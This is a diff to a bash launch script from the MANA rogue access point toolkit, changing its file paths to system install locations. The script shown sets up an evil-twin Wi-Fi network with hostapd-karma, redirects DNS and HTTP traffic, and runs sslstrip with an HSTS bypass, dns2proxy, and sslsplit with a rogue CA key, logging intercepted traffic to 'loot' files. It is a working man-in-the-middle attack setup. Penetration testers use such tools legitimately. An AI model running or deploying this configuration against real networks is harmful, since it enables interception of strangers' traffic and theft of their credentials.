@@ -1,7 +1,9 @@
+#!/bin/bash
+
 upstream=eth0
 phy=wlan0
-conf=conf/hostapd-karma.conf
-hostapd=../hostapd-manna/hostapd/hostapd
+conf=/etc/mana-toolkit/hostapd-karma.conf
+hostapd=/usr/lib/mana-toolkit/hostapd
 
 hostname WRT54G
 echo hostname WRT54G
@@ -20,7 +22,7 @@ sleep 5
 ifconfig $phy 10.0.0.1 netmask 255.255.255.0
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 
-dhcpd -cf conf/dhcpd.conf $phy
+dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy
 
 echo '1' > /proc/sys/net/ipv4/ip_forward
 iptables --policy INPUT ACCEPT
@@ -34,14 +36,14 @@ iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 #iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
 
 #SSLStrip with HSTS bypass
-cd ../sslstrip-hsts/
-python sslstrip.py -l 10000 -a -w ../loot/sslstrip.log&
+cd /usr/share/mana-toolkit/sslstrip-hsts/
+python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log&
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 python dns2proxy.py $phy&
 cd -
 
 #SSLSplit
-sslsplit -D -P -Z -S ../loot/sslsplit -c cert/rogue-ca.pem -k cert/rogue-ca.key -O -l ../loot/sslsplit-connect.log \
+sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log \
  https 0.0.0.0 10443 \
  http 0.0.0.0 10080 \
  ssl 0.0.0.0 10993 \
